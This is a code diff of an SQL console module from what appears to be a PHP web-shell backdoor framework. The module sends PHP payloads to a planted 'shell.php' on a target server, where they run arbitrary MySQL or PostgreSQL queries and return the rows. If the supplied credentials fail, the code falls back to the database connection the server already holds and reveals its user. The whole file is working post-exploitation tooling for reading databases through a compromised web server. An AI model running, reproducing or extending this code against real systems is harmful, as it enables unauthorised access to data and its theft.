@@ -1,51 +1,116 @@
-'''
-Created on 22/ago/2011
+from core.moduleprobeall import ModuleProbe
+from core.moduleexception import ModuleException, ProbeException
+from core.savedargparse import SavedArgumentParser as ArgumentParser
+import re
 
-@author: norby
-'''
+WARN_NO_DATA = 'No data returned'
+WARN_CHECK_CRED = 'check credentials and dbms availability'
+WARN_FALLBACK = 'bad credentials, falling back to default ones'
 
-from core.module import Module, ModuleException
-from core.vector import VectorList, Vector
-import random
-from core.parameters import ParametersList, Parameter as P
+class Console(ModuleProbe):
+    '''Execute SQL queries'''
+    
+    def _set_vectors(self):
+        
+        self.support_vectors.add_vector('mysql', 'shell.php', ["""if(mysql_connect("$host","$user","$pass")){
+$result = mysql_query("$query"); if($result) {
+while ($content = mysql_fetch_row($result)) {
+foreach($content as $key => $value){echo $value . "|";} echo "\n";}}
+mysql_close();}""" ])
+        self.support_vectors.add_vector('mysql_fallback', 'shell.php', [ """$result = mysql_query("$query");
+if($result) {
+while ($content = mysql_fetch_row($result)) {
+foreach($content as $key => $value){echo $value . "|";} echo "\n";}}"""]),
+        self.support_vectors.add_vector('pg', 'shell.php', ["""if(pg_connect("host=$host user=$user password=$pass")){
+$result = pg_query("$query"); if($result) {
+while ($content = pg_fetch_row($result)) {
+foreach($content as $key => $value){echo $value . "|";} echo "\n";}}
+pg_close();}""" ]),
+        self.support_vectors.add_vector('pg_fallback', 'shell.php', [ """$result = pg_query("$query");
+if($result) {
+while ($content = pg_fetch_row($result)) {
+foreach($content as $key => $value){echo $value . "|";} echo "\n";}}
+pg_close();"""])
+                                                
+                             
+    
 
-classname = 'Console'
+    def _set_args(self):
+        self.argparser.add_argument('user', help='SQL username')
+        self.argparser.add_argument('pass', help='SQL password')
+        self.argparser.add_argument('-host', help='DBMS host or host:port', default='127.0.0.1')
+        self.argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
+        self.argparser.add_argument('-query', help='Execute single query')
+
+    def _init_module(self):
+        self.stored_args['vector'] = None
+        self.stored_args['prompt'] = 'SQL> '
+        
+    def _query(self, query):
+        
+        # Does not re-use fallback vectors
+        if self.stored_args['vector'] and not self.stored_args['vector'].endswith('_fallback'):
+            vector = self.stored_args['vector']
+        else:
+            vector = self.args['dbms']
+        
+        result = self.support_vectors.get(vector).execute({ 'host' : self.args['host'], 'user' : self.args['user'], 'pass' : self.args['pass'], 'query' : query })
+        
+        if not result:
+            
+            vector = self.args['dbms'] + '_fallback'
+            
+            result = self.support_vectors.get(vector).execute({ 'query' : query })
+      
+            if result:
+                
+                # First fallback call. Set console
+                
+                get_current_user = 'SELECT USER;' if self.args['dbms'] == 'postgres' else 'SELECT USER();'
+                
+                user = self.support_vectors.get(vector).execute({ 'query' : get_current_user })
+                
+                if user:
+                    user = user[:-1]
+                    self.stored_args['prompt'] = '%s SQL> ' % user
+                    self.stored_args['vector'] = vector
+                    self.mprint('\'%s:%s@%s\' %s: \'%s\'' % (self.args['user'], self.args['pass'], self.args['host'], WARN_FALLBACK, user))
+           
+                
+        elif result and self.stored_args['vector'] == None:
+                self.stored_args['prompt'] = "%s@%s SQL> " % (self.args['user'], self.args['host'])
+                self.stored_args['vector'] = vector
+        
+        if result:
+            return [ line.split('|') for line in result[:-1].replace('|\n', '\n').split('\n') ]   
 
 
-class Console(Module):
-    '''Start SQL console'''
+        
 
-    params = ParametersList('Start SQL console', [],
-            P(arg='dbms', help='Database', choices=['mysql', 'postgres'], required=True, pos=0),
-            P(arg='user', help='SQL user', required=True, pos=1),
-            P(arg='pwd', help='SQL password', required=True, pos=2),
-            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=3)
-            )
+    def _probe(self):
 
-    def run_module( self, mode, user, pwd, host):
+        self.args['dbms'] = 'pg' if self.args['dbms'] == 'postgres' else 'mysql'
 
-        self.mprint('[%s] No saved state, commands like \'USE database\' are ineffective. Press Ctrl-C to quit.\n' % (self.name))
-
-        prompt        = "%s@%s SQL> " % (user, host)
-
-        self.modhandler.set_verbosity(2)
-
-        try:
+        if not self.args['query']:
             while True:
+                self._result = None
+                self._output = ''
+                
+                query  = raw_input( self.stored_args['prompt'] ).strip()
+                self._result = self._query(query)
+                
+                if self._result == None:
+                    self.mprint('%s %s' % (WARN_NO_DATA, WARN_CHECK_CRED))
+                elif not self._result:
+                    self.mprint(WARN_NO_DATA)
+                else:
+                    self._output_result()
+                    
+                print self._output
+                    
+                
+        else:
+            self._result = self._query(self.args['query'])
 
-                cmd       = raw_input( prompt )
-                cmd       = cmd.strip()
-
-                if cmd:
-                    response = self.modhandler.load('sql.query').run({'dbms' : mode, 'user' : user, 'pwd': pwd, 'query' : cmd, 'host' : host})
-
-                    if response:
-                        print response
-                    else:
-                        self.mprint('[%s] No data returned' % self.name)
-
-        except KeyboardInterrupt:
-            self.modhandler.set_verbosity()
-            raise
-
-
+            if self._result == None:
+                self.mprint('%s %s' % (WARN_NO_DATA, WARN_CHECK_CRED))
